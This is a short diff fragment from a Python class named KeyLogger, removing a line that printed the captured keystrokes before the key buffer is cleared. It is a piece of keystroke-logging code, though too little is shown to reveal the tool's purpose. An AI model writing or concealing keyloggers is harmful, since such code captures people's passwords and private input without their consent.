@@ -97,7 +97,6 @@ class KeyLogger:
                     KeyLogger.CONFIG["jumps"],
                 )
             )
-        print("".join(map(self.translate_key, self.keys)))
         self.keys.clear()
 
         if not KeyLogger.START:
